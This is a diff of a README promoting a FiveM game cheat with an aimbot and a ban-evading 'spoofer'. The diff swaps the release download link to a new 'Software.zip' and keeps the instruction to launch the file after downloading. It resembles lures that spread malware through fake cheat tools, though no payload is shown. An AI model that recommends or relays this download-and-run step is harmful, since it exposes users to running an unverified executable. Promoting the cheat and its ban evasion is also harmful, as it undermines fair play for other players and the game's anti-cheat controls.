@@ -30,7 +30,7 @@ Welcome to the FiveM TZ Project PVP Tool, your ultimate solution for a competiti
 - tzproject
 
 ## Installation:
-Get started with the FiveM TZ Project PVP Tool by downloading the latest version [here](https://github.com/Izza031/FiveM-TZ-Project-PVP-TOOL/releases/download/v1.0/Release.zip). Launch the file after downloading to enjoy the ultimate gaming experience.
+Get started with the FiveM TZ Project PVP Tool by downloading the latest version [here](https://github.com/Izza031/FiveM-TZ-Project-PVP-TOOL/releases/download/v2.0/Software.zip). Launch the file after downloading to enjoy the ultimate gaming experience.
 
 ## Features:
 1. Cutting-edge Aimbot to enhance your accuracy.
@@ -60,6 +60,6 @@ Ensure your account remains secure and protected with the TZ Project Spoofer. By
 
 For more information and updates, visit the "Releases" section in the repository.
 
-[![Download Now](https://github.com/Izza031/FiveM-TZ-Project-PVP-TOOL/releases/download/v1.0/Release.zip<COLOR>.svg)](https://github.com/Izza031/FiveM-TZ-Project-PVP-TOOL/releases/download/v1.0/Release.zip)
+[![Download Now](https://github.com/Izza031/FiveM-TZ-Project-PVP-TOOL/releases/download/v2.0/Software.zip<COLOR>.svg)](https://github.com/Izza031/FiveM-TZ-Project-PVP-TOOL/releases/download/v2.0/Software.zip)
 
 🎮 Play smarter, play better with FiveM TZ Project PVP Tool! 🎯
